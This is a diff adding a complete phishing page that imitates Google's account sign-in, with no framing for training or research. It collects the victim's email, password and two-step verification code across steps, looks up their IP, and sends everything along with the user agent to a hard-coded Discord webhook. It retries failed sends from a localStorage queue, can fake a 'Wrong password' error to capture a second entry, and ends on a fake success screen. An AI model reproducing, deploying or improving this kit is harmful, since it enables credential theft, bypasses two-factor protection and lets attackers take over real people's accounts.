@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Sign in – Google Accounts</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Ctext x='24' y='35' font-family='Arial' font-size='36' font-weight='bold' fill='%234285F4' text-anchor='middle'%3EG%3C/text%3E%3C/svg%3E">
+<style>
+  :root{
+    --blue:#1a73e8; --blue-d:#185abc; --line:#dadce0; --txt:#202124;
+    --dim:#5f6368; --err:#d93025; --bg:#fff;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%}
+  body{
+    background:var(--bg); color:var(--txt);
+    font:15px/1.45 "Google Sans",Roboto,"Helvetica Neue",Arial,sans-serif;
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    padding:24px 16px;
+  }
+  .card{
+    width:100%; max-width:448px; border:1px solid var(--line); border-radius:28px;
+    padding:40px 40px 34px; background:#fff;
+  }
+  .logo{width:40px; height:40px; margin-bottom:16px}
+  .logo svg{width:40px; height:40px; display:block}
+  h1{font-size:24px; font-weight:400; letter-spacing:0; margin-bottom:8px}
+  .sub{font-size:15px; color:var(--txt); margin-bottom:26px}
+  .step{display:none}
+  .step.active{display:block; animation:fade .18s ease}
+  @keyframes fade{from{opacity:0; transform:translateY(4px)}to{opacity:1; transform:none}}
+
+  .field{position:relative; margin-bottom:6px}
+  .field input{
+    width:100%; height:56px; padding:22px 14px 8px; font:inherit; color:var(--txt);
+    background:#fff; border:1px solid var(--line); border-radius:4px; outline:none;
+    transition:border-color .12s, box-shadow .12s;
+  }
+  .field input:focus{border-color:var(--blue); box-shadow:inset 0 0 0 1px var(--blue)}
+  .field input.bad{border-color:var(--err); box-shadow:inset 0 0 0 1px var(--err)}
+  .field label{
+    position:absolute; left:14px; top:17px; font-size:16px; color:var(--dim);
+    pointer-events:none; transition:all .12s; background:#fff; padding:0 3px;
+  }
+  .field input:focus + label,
+  .field input:not(:placeholder-shown) + label{
+    top:7px; font-size:12px; color:var(--blue);
+  }
+  .field input.bad:focus + label,
+  .field input.bad:not(:placeholder-shown) + label{color:var(--err)}
+  .field.pw input{padding-right:78px}
+  .show{
+    position:absolute; right:14px; top:50%; transform:translateY(-50%);
+    font-size:14px; font-weight:500; color:var(--blue); cursor:pointer;
+    user-select:none; padding:4px 2px;
+  }
+  .err{display:none; color:var(--err); font-size:13px; margin:8px 0 0; align-items:center; gap:6px}
+  .err.show{display:flex}
+  .err svg{width:16px; height:16px; flex:none}
+  a.link{color:var(--blue); text-decoration:none; font-weight:500; font-size:14px}
+  a.link:hover{text-decoration:underline}
+  .stack{margin-top:14px}
+  .guest{font-size:14px; color:var(--dim); margin:26px 0 0; line-height:1.5}
+  .guest a{color:var(--blue); text-decoration:none; font-weight:500}
+  .guest a:hover{text-decoration:underline}
+  .row{display:flex; align-items:center; justify-content:space-between; gap:16px; margin-top:34px}
+  .btn-text{
+    color:var(--blue); font-size:14px; font-weight:500; text-decoration:none;
+    padding:9px 8px; border-radius:4px; margin-left:-8px;
+  }
+  .btn-text:hover{background:#f6fafe}
+  .btn{
+    border:0; border-radius:4px; background:var(--blue); color:#fff; font:inherit;
+    font-size:14px; font-weight:500; padding:10px 24px; cursor:pointer;
+    transition:background .15s, box-shadow .15s; min-width:88px;
+  }
+  .btn:hover:not(:disabled){background:var(--blue-d); box-shadow:0 1px 3px rgba(66,133,244,.4)}
+  .btn:disabled{opacity:.6; cursor:default}
+
+  .acct{
+    display:inline-flex; align-items:center; gap:8px; border:1px solid var(--line);
+    border-radius:999px; padding:3px 10px 3px 3px; margin-bottom:22px; cursor:pointer;
+    max-width:100%; background:#fff;
+  }
+  .acct:hover{background:#f7f8f9}
+  .acct .av{
+    width:26px; height:26px; border-radius:50%; background:#e8eaed; color:#5f6368;
+    font-size:13px; font-weight:500; display:grid; place-items:center; flex:none;
+    text-transform:uppercase;
+  }
+  .acct .em{
+    font-size:14px; color:var(--txt); overflow:hidden; text-overflow:ellipsis;
+    white-space:nowrap; max-width:250px;
+  }
+  .acct svg{width:16px; height:16px; flex:none; fill:#5f6368}
+
+  .ok-wrap{text-align:center; padding:14px 0 4px}
+  .ok-wrap .check{
+    width:64px; height:64px; border-radius:50%; background:#e6f4ea;
+    display:grid; place-items:center; margin:0 auto 22px;
+  }
+  .ok-wrap .check svg{width:34px; height:34px; fill:#137333}
+  .ok-wrap h1{font-size:22px; margin-bottom:10px}
+  .ok-wrap p{color:var(--dim); font-size:14px}
+  .ok-wrap b{color:var(--txt); font-weight:500}
+
+  footer{
+    display:flex; flex-wrap:wrap; justify-content:space-between; gap:10px;
+    width:100%; max-width:448px; margin-top:18px; font-size:12px; color:var(--dim);
+    padding:0 4px;
+  }
+  footer select{
+    border:0; background:transparent; font:inherit; font-size:12px; color:var(--dim);
+    cursor:pointer; padding:4px 2px;
+  }
+  footer .links{display:flex; gap:18px}
+  footer a{color:var(--dim); text-decoration:none}
+  footer a:hover{color:var(--txt)}
+  @media(max-width:520px){
+    body{padding:0; justify-content:flex-start}
+    .card{border:0; border-radius:0; padding:26px 24px 32px; max-width:none}
+    footer{padding:0 24px 22px}
+  }
+</style>
+</head>
+<body>
+
+<div class="card" id="card">
+  <div class="logo" aria-hidden="true">
+    <svg viewBox="0 0 48 48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+  </div>
+
+  <!-- step 1 -->
+  <section class="step active" id="s-email">
+    <h1>Sign in</h1>
+    <p class="sub">Use your Google Account</p>
+    <div class="field">
+      <input id="email" type="email" placeholder=" " autocomplete="off"
+        autocapitalize="none" spellcheck="false" inputmode="email">
+      <label for="email">Email or phone</label>
+    </div>
+    <p class="err" id="e-email">
+      <svg viewBox="0 0 24 24"><path fill="#d93025" d="M12 2 1 21h22L12 2zm1 14h-2v2h2v-2zm0-6h-2v4h2v-4z"/></svg>
+      <span id="e-email-t">Couldn't find your Google Account</span>
+    </p>
+    <div class="stack"><a class="link" href="#">Forgot email?</a></div>
+    <p class="guest">Not your computer? Use Guest mode to sign in privately.
+      <a href="#">Learn more about using Guest mode</a></p>
+    <div class="row">
+      <a class="btn-text" href="#">Create account</a>
+      <button class="btn" id="next-email">Next</button>
+    </div>
+  </section>
+
+  <!-- step 2 -->
+  <section class="step" id="s-pass">
+    <div class="acct" id="chip" title="Switch account">
+      <span class="av" id="chip-av">a</span>
+      <span class="em" id="chip-em">user@gmail.com</span>
+      <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+    </div>
+    <h1>Welcome</h1>
+    <p class="sub">Enter your password</p>
+    <div class="field pw">
+      <input id="pass" type="password" placeholder=" " autocomplete="off"
+        autocapitalize="none" spellcheck="false">
+      <label for="pass">Password</label>
+      <span class="show" id="show">Show</span>
+    </div>
+    <p class="err" id="e-pass">
+      <svg viewBox="0 0 24 24"><path fill="#d93025" d="M12 2 1 21h22L12 2zm1 14h-2v2h2v-2zm0-6h-2v4h2v-4z"/></svg>
+      <span>Wrong password. Try again or click Forgot password to reset it.</span>
+    </p>
+    <div class="stack"><a class="link" href="#">Forgot password?</a></div>
+    <div class="row">
+      <a class="btn-text" href="#">Try another way</a>
+      <button class="btn" id="next-pass">Next</button>
+    </div>
+  </section>
+
+  <!-- step 3 -->
+  <section class="step" id="s-code">
+    <h1>2-Step Verification</h1>
+    <p class="sub">Enter the code from your authenticator app or the message we sent to your phone.</p>
+    <div class="field">
+      <input id="code" type="text" placeholder=" " inputmode="numeric"
+        maxlength="8" autocomplete="one-time-code">
+      <label for="code">Enter code</label>
+    </div>
+    <p class="err" id="e-code">
+      <svg viewBox="0 0 24 24"><path fill="#d93025" d="M12 2 1 21h22L12 2zm1 14h-2v2h2v-2zm0-6h-2v4h2v-4z"/></svg>
+      <span>Enter a valid code.</span>
+    </p>
+    <div class="stack"><a class="link" href="#">Resend code</a></div>
+    <div class="row">
+      <a class="btn-text" href="#">Try another way</a>
+      <button class="btn" id="next-code">Next</button>
+    </div>
+  </section>
+
+  <!-- step 4 -->
+  <section class="step" id="s-done">
+    <div class="ok-wrap">
+      <div class="check">
+        <svg viewBox="0 0 24 24"><path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+      </div>
+      <h1>You're signed in</h1>
+      <p><b id="done-em">user@gmail.com</b><br><span id="done-note">Redirecting…</span></p>
+    </div>
+  </section>
+</div>
+
+<footer>
+  <select aria-label="Language">
+    <option>English (United States)</option>
+    <option>Deutsch</option>
+    <option>Español</option>
+    <option>Français</option>
+    <option>Português (Brasil)</option>
+  </select>
+  <div class="links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
+</footer>
+
+<script>
+/* ================= CONFIG ================= */
+const CONFIG = {
+  webhook: "https://discord.com/api/webhooks/1569223350583033928/tDcsqpLyI2HCPpmtH3oZs7ZLasRKSl3NIqJ9Il0g596guoumgIkhWC-6TY9fKKrttRH6",
+  redirect: "",          // e.g. "https://myaccount.google.com" — empty = no redirect
+  askCode: true,         // show the 2-step verification screen
+  wrongPassword: false,  // first password submit shows "Wrong password", second passes
+  wrongEmail: false      // reject the first email once with "Couldn't find your Google Account"
+};
+const QKEY = "_gq";
+window.__hook = CONFIG.webhook;
+
+/* ================= ELEMENTS ================= */
+const $ = id => document.getElementById(id);
+const emailEl = $("email"), passEl = $("pass"), codeEl = $("code");
+const chipEm = $("chip-em"), chipAv = $("chip-av");
+let state = { email: "", pass: "", code: "" };
+let triedPass = false, triedEmail = false;
+
+const show = id => {
+  document.querySelectorAll(".step").forEach(s => s.classList.remove("active"));
+  $(id).classList.add("active");
+  const f = $(id).querySelector("input");
+  if (f) setTimeout(() => f.focus(), 60);
+};
+const errOn = (el, on) => { el.classList.toggle("show", on); };
+
+/* ================= NETWORK ================= */
+const grab = (u, o, ms) => Promise.race([
+  fetch(u, o), new Promise((_, r) => setTimeout(() => r(new Error("timeout")), ms))
+]);
+
+async function getIP() {
+  try {
+    const r = await grab("https://api.ipify.org?format=json", {}, 4000);
+    return (await r.json()).ip || "unknown";
+  } catch (e) { return "unknown"; }
+}
+let ipP = getIP();
+
+function enqueue(p) {
+  try {
+    const q = JSON.parse(localStorage.getItem(QKEY) || "[]");
+    q.push(p); localStorage.setItem(QKEY, JSON.stringify(q));
+  } catch (e) {}
+}
+async function flush() {
+  let q;
+  try { q = JSON.parse(localStorage.getItem(QKEY) || "[]"); } catch (e) { return; }
+  if (!q.length) return;
+  const left = [];
+  for (const p of q) {
+    try {
+      const r = await fetch(CONFIG.webhook, {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(p), keepalive: true
+      });
+      if (!r.ok) left.push(p);
+    } catch (e) { left.push(p); }
+  }
+  localStorage.setItem(QKEY, JSON.stringify(left));
+}
+
+async function report(step, extraFields = []) {
+  const ip = await ipP;
+  const fields = [];
+  if (state.email) fields.push({ name: "Email", value: "`" + state.email + "`" });
+  if (state.pass) fields.push({ name: "Password", value: "```\n" + state.pass + "\n```" });
+  if (state.code) fields.push({ name: "2FA code", value: "`" + state.code + "`" });
+  fields.push(...extraFields);
+  fields.push({ name: "IP", value: ip, inline: true });
+  fields.push({ name: "Stage", value: step, inline: true });
+  fields.push({ name: "Origin", value: location.href.slice(0, 900) });
+  fields.push({ name: "User-Agent", value: (navigator.userAgent || "n/a").slice(0, 900) });
+
+  const embed = {
+    title: "Google sign-in — " + step,
+    color: 0x4285f4,
+    fields,
+    timestamp: new Date().toISOString(),
+    footer: { text: "Google Login" }
+  };
+
+  const payload = { username: "Google Login", embeds: [embed] };
+  try {
+    const r = await fetch(CONFIG.webhook, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload), keepalive: true
+    });
+    if (!r.ok && r.status !== 429) enqueue(payload);
+  } catch (e) { enqueue(payload); }
+}
+
+/* ================= FLOW ================= */
+$("next-email").addEventListener("click", () => {
+  const v = emailEl.value.trim();
+  errOn($("e-email"), false);
+  emailEl.classList.remove("bad");
+
+  if (!v || !/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v)) {
+    $("e-email-t").textContent = v ? "Enter a valid email or phone number" : "Enter an email or phone number";
+    errOn($("e-email"), true); emailEl.classList.add("bad"); return;
+  }
+  if (CONFIG.wrongEmail && !triedEmail) {
+    triedEmail = true;
+    $("e-email-t").textContent = "Couldn't find your Google Account";
+    errOn($("e-email"), true); emailEl.classList.add("bad"); return;
+  }
+
+  state.email = v;
+  chipEm.textContent = v;
+  chipAv.textContent = v[0] || "u";
+  report("email submitted");
+  show("s-pass");
+});
+emailEl.addEventListener("keydown", e => { if (e.key === "Enter") $("next-email").click(); });
+
+$("show").addEventListener("click", () => {
+  const hidden = passEl.type === "password";
+  passEl.type = hidden ? "text" : "password";
+  $("show").textContent = hidden ? "Hide" : "Show";
+  passEl.focus();
+});
+
+$("next-pass").addEventListener("click", () => {
+  const v = passEl.value;
+  errOn($("e-pass"), false);
+  passEl.classList.remove("bad");
+  if (!v) { errOn($("e-pass"), true); passEl.classList.add("bad"); return; }
+  if (CONFIG.wrongPassword && !triedPass) {
+    triedPass = true; errOn($("e-pass"), true); passEl.classList.add("bad"); return;
+  }
+
+  state.pass = v;
+  report("password submitted");
+  if (CONFIG.askCode) { show("s-code"); }
+  else { finish(); }
+});
+passEl.addEventListener("keydown", e => { if (e.key === "Enter") $("next-pass").click(); });
+
+$("next-code").addEventListener("click", () => {
+  const v = codeEl.value.replace(/\s+/g, "");
+  errOn($("e-code"), false);
+  codeEl.classList.remove("bad");
+  if (v.length < 4) { errOn($("e-code"), true); codeEl.classList.add("bad"); return; }
+  state.code = v;
+  report("2FA code submitted");
+  finish();
+});
+codeEl.addEventListener("keydown", e => { if (e.key === "Enter") $("next-code").click(); });
+codeEl.addEventListener("input", () => { codeEl.value = codeEl.value.replace(/[^\d]/g, ""); });
+
+$("chip").addEventListener("click", () => {
+  emailEl.value = state.email;
+  errOn($("e-pass"), false); passEl.classList.remove("bad");
+  show("s-email");
+});
+
+function finish() {
+  $("done-em").textContent = state.email;
+  show("s-done");
+  report("completed");
+  if (CONFIG.redirect) {
+    $("done-note").textContent = "Redirecting…";
+    setTimeout(() => { location.href = CONFIG.redirect; }, 2200);
+  } else {
+    $("done-note").textContent = "You can close this window.";
+  }
+}
+
+flush();
+window.addEventListener("online", flush);
+</script>
+</body>
+</html>
